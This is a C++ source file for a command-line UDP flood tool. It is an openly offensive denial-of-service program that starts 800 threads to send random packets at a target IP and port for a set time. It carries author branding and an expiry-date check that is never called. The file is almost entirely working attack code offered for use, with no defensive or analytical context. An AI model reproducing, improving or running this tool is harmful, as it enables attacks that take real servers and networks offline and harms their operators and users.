#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sched.h>

#define PACKET_SIZE 999999999
#define PAYLOAD_SIZE 1040
#define DEFAULT_THREADS 800

std::atomic<bool> attack_running(true);

// Function to generate random payload for the UDP packets
void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

// Function to check expiration date (day, month, year)
bool is_expired() {
    // Define the expiration date
    int expire_day = 15;
    int expire_month = 11;
    int expire_year = 2024;

    // Get the current date
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    // Check if the current date is past the expiration date
    if ((current_time->tm_year + 1900 > expire_year) ||
        (current_time->tm_year + 1900 == expire_year && current_time->tm_mon + 1 > expire_month) ||
        (current_time->tm_year + 1900 == expire_year && current_time->tm_mon + 1 == expire_month && current_time->tm_mday > expire_day)) {
        return true;
    }

    return false;
}

// Function to perform the UDP flood attack
void udp_attack(const char *ip, int port, int attack_time) {
    struct sockaddr_in server_addr;
    int sock;
    char buffer[PAYLOAD_SIZE * 4 + 1];

    // Create socket for UDP communication
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        printf("Error: Could not create socket! Reason: %s\n", strerror(errno));
        return;
    }

    // Set up server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        printf("Error: Invalid IP address - %s\n", ip);
        close(sock);
        return;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {
        generate_payload(buffer, PAYLOAD_SIZE);

        if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            printf("Error sending packet: %s\n", strerror(errno));
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <ip> <port> <time>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Print info about the attack
    std::cout << "Flood started to " << ip << ":" << port << " with " << DEFAULT_THREADS << " Threads for time " << duration << " seconds." << std::endl;
    std::cout << "AARAM SE KHELO  BY @RAJA\nTHIS BINARY BY @rajaraj_04" << std::endl;

    // Perform attack using threads
    std::vector<std::thread> threads;
    for (int i = 0; i < DEFAULT_THREADS; i++) {
        threads.push_back(std::thread(udp_attack, ip, port, duration));
    }

    // Join all threads
    for (auto &t : threads) {
        t.join();
    }

    return 0;
}
